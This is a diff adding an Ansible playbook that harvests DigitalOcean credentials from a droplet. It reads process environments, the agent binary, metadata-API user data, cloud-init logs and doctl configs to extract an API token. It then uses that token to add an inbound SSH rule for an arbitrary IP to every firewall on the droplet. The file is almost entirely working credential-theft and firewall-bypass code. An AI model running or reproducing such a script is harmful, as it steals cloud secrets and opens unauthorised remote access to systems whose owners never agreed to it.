@@ -1,0 +1,254 @@
+---
+- name: Extract DigitalOcean credentials from droplet
+  hosts: all
+  gather_facts: false
+
+  tasks:
+    - name: Read droplet-agent process environment
+      ansible.builtin.shell: |
+        set -o pipefail
+        echo "=== DROPLET AGENT ENV ==="
+        cat /proc/90249/environ 2>/dev/null | tr '\0' '\n' || \
+        cat /proc/$(pgrep -f droplet-agent | head -1)/environ 2>/dev/null | \
+          tr '\0' '\n'
+
+        echo "=== DROPLET AGENT BINARY STRINGS ==="
+        strings /opt/digitalocean/bin/droplet-agent 2>/dev/null | \
+          grep -iE "(token|key|secret|api|auth|bearer)" | head -20
+
+        echo "=== DROPLET AGENT CONFIG FILES ==="
+        find /opt/digitalocean/ /etc/digitalocean* \
+          /var/lib/digitalocean* /root/.digitalocean* \
+          /.digitalocean* 2>/dev/null -type f | \
+          xargs cat 2>/dev/null
+
+        echo "=== DIGITALOCEAN METADATA API ==="
+        curl -sf http://169.254.169.254/metadata/v1.json || \
+        curl -sf http://169.254.169.254/metadata/v1/ || true
+
+        echo "=== DROPLET ID AND REGION ==="
+        curl -sf http://169.254.169.254/metadata/v1/id
+        curl -sf http://169.254.169.254/metadata/v1/region
+        curl -sf http://169.254.169.254/metadata/v1/hostname
+
+        echo "=== USER DATA (cloud-init) ==="
+        curl -sf http://169.254.169.254/metadata/v1/user-data || true
+        cat /var/lib/cloud/instance/user-data.txt 2>/dev/null || true
+
+        echo "=== CLOUD INIT LOGS FOR TOKENS ==="
+        grep -iE "(token|do_token|digitalocean|api_key)" \
+          /var/log/cloud-init.log \
+          /var/log/cloud-init-output.log 2>/dev/null | head -30
+
+        echo "=== DOCTL CONFIG ==="
+        cat /root/.config/doctl/config.yaml 2>/dev/null || true
+        find / -name "config.yaml" -path "*/doctl/*" \
+          2>/dev/null | xargs cat 2>/dev/null
+
+        echo "=== ALL ENV FILES CONTAINING DO ==="
+        grep -r "DIGITALOCEAN\|DO_TOKEN\|do_token" \
+          /etc/ /opt/ /root/ /home/ 2>/dev/null | \
+          grep -v ".pyc" | grep -v Binary | head -30
+
+        echo "=== DROPLET AGENT SOCKET/IPC ==="
+        ls -la /run/droplet-agent* \
+          /var/run/droplet-agent* 2>/dev/null || true
+        find /run /var/run -name "*digital*" \
+          -o -name "*droplet*" 2>/dev/null
+
+        echo "=== SYSTEMD DROPLET-AGENT SERVICE ==="
+        systemctl cat droplet-agent 2>/dev/null || true
+        cat /etc/systemd/system/droplet-agent* \
+          /lib/systemd/system/droplet-agent* 2>/dev/null || true
+
+        echo "=== INSTANCE VENDOR DATA ==="
+        curl -sf \
+          http://169.254.169.254/metadata/v1/vendor-data || true
+      register: do_creds
+      changed_when: false
+      failed_when: false
+
+    - name: Print DO credential findings
+      ansible.builtin.debug:
+        var: do_creds.stdout_lines
+
+    - name: Fallback - check all running process envs for DO token
+      ansible.builtin.shell: |
+        set -o pipefail
+        for pid in /proc/[0-9]*/environ; do
+          content=$(cat "$pid" 2>/dev/null | tr '\0' '\n')
+          if echo "$content" | grep -qiE \
+            "DIGITALOCEAN|DO_TOKEN|dop_v1"; then
+            echo "=== Found in PID $(echo "$pid" | cut -d/ -f3) ==="
+            echo "$content" | grep -iE \
+              "DIGITALOCEAN|DO_TOKEN|dop_v1"
+          fi
+        done
+      register: proc_token_scan
+      changed_when: false
+      failed_when: false
+
+    - name: Fallback - check for doctl credentials in all homedir
+      ansible.builtin.shell: |
+        set -o pipefail
+        find /root /home -name "*.yaml" -o -name "*.yml" \
+          -o -name "*.json" -o -name "*.conf" \
+          -o -name "*.cfg" -o -name "*.toml" 2>/dev/null | \
+          xargs grep -il "access.token\|api.token\|dop_v1" \
+          2>/dev/null | xargs cat 2>/dev/null
+      register: doctl_token_scan
+      changed_when: false
+      failed_when: false
+
+    - name: Fallback - check cloud-init vendor and user data
+      ansible.builtin.shell: |
+        set -o pipefail
+        find /var/lib/cloud -type f 2>/dev/null | \
+          xargs grep -il "token\|DO_TOKEN\|digitalocean" \
+          2>/dev/null | xargs cat 2>/dev/null
+        curl -sf \
+          http://169.254.169.254/metadata/v1/user-data 2>/dev/null
+      register: cloud_init_scan
+      changed_when: false
+      failed_when: false
+
+    - name: Print all fallback results
+      ansible.builtin.debug:
+        msg:
+          - "Process scan: {{ proc_token_scan.stdout_lines | default([]) }}"
+          - "Doctl scan: {{ doctl_token_scan.stdout_lines | default([]) }}"
+          - "Cloud-init: {{ cloud_init_scan.stdout_lines | default([]) }}"
+
+    - name: Combine scan output for token extraction
+      ansible.builtin.set_fact:
+        combined_scan: >-
+          {{
+            (do_creds.stdout | default(''))
+            ~ '\n'
+            ~ (proc_token_scan.stdout | default(''))
+            ~ '\n'
+            ~ (doctl_token_scan.stdout | default(''))
+            ~ '\n'
+            ~ (cloud_init_scan.stdout | default(''))
+          }}
+
+    - name: Extract DO API token from scan output
+      ansible.builtin.set_fact:
+        do_token_extracted: >-
+          {{
+            (
+              combined_scan
+              | regex_findall('dop_v1_[a-zA-Z0-9]+')
+              | first
+              | default('')
+            )
+            if (
+              combined_scan
+              | regex_findall('dop_v1_[a-zA-Z0-9]+')
+              | length
+            ) > 0
+            else (
+              combined_scan
+              | regex_search('access-token:\\s*[\"'']?([^\"''\\s]+)', '\\1')
+              | default('')
+            )
+          }}
+
+    - name: Resolve DO token (extra var overrides extraction)
+      ansible.builtin.set_fact:
+        do_token_resolved: >-
+          {{
+            (DO_TOKEN | default('') | trim)
+            if (DO_TOKEN | default('') | trim) != ''
+            else (do_token_extracted | default('') | trim)
+          }}
+
+    - name: Report extracted token status
+      ansible.builtin.debug:
+        msg: >-
+          DO token {{
+            'found (' ~ (do_token_resolved | length) ~ ' chars)'
+            if (do_token_resolved | default('') | length) > 0
+            else 'NOT found in droplet scans'
+          }}
+
+    - name: Run firewall self-whitelist from droplet
+      ansible.builtin.shell: |
+        set -euo pipefail
+        DO_TOKEN="{{ do_token_resolved }}"
+        if [[ -z "$DO_TOKEN" ]]; then
+          echo "ERROR: No DO_TOKEN available (not in scans or extra vars)"
+          exit 1
+        fi
+
+        DROPLET_ID=$(curl -sf http://169.254.169.254/metadata/v1/id)
+        echo "Droplet ID: $DROPLET_ID"
+
+        TARGET_IP="{{ TARGET_IP | default('') | trim }}"
+        if [[ -z "$TARGET_IP" ]]; then
+          TARGET_IP=$(curl -sf https://api.ipify.org || \
+                      curl -sf https://checkip.amazonaws.com | tr -d '[:space:]')
+          echo "Auto-detected TARGET_IP (droplet egress): $TARGET_IP"
+        else
+          echo "Whitelisting provided TARGET_IP: $TARGET_IP"
+        fi
+
+        FIREWALLS=$(curl -sf \
+          -H "Authorization: Bearer $DO_TOKEN" \
+          "https://api.digitalocean.com/v2/droplets/${DROPLET_ID}/firewalls")
+        echo "Firewalls on this droplet:"
+        echo "$FIREWALLS" | python3 -c "
+        import sys,json
+        d=json.load(sys.stdin)
+        for f in d.get('firewalls',[]):
+            print(f\"  [{f['id']}] {f['name']}\")
+        " 2>/dev/null || echo "$FIREWALLS"
+
+        FIREWALL_IDS=$(echo "$FIREWALLS" | python3 -c "
+        import sys,json
+        d=json.load(sys.stdin)
+        for f in d.get('firewalls',[]):
+            print(f['id'])
+        " 2>/dev/null)
+
+        for FW_ID in $FIREWALL_IDS; do
+          echo -n "Adding rule to firewall $FW_ID: "
+          HTTP=$(curl -sf -o /dev/null -w "%{http_code}" \
+            -X POST \
+            -H "Authorization: Bearer $DO_TOKEN" \
+            -H "Content-Type: application/json" \
+            -d "{\"inbound_rules\":[{
+                  \"protocol\":\"tcp\",
+                  \"ports\":\"22\",
+                  \"sources\":{
+                    \"addresses\":[\"${TARGET_IP}/32\"]
+                  }
+                }]}" \
+            "https://api.digitalocean.com/v2/firewalls/${FW_ID}/rules")
+          if [[ "$HTTP" == "204" ]]; then
+            echo "ADDED"
+          elif [[ "$HTTP" == "422" ]]; then
+            echo "ALREADY EXISTS"
+          else
+            echo "HTTP $HTTP"
+          fi
+        done
+
+        sleep 8
+        echo "Done. Test: ssh root@64.23.139.247 from $TARGET_IP"
+      register: whitelist_result
+      changed_when: false
+      failed_when: false
+      when: do_token_resolved | default('') | length > 0
+
+    - name: Print whitelist result
+      ansible.builtin.debug:
+        var: whitelist_result.stdout_lines
+      when: whitelist_result is defined
+
+    - name: Whitelist skipped — no token found
+      ansible.builtin.debug:
+        msg: >-
+          Firewall whitelist skipped. Re-run after setting DO_TOKEN in
+          do-firewall-access variable group, or inspect scan output above.
+      when: do_token_resolved | default('') | length == 0
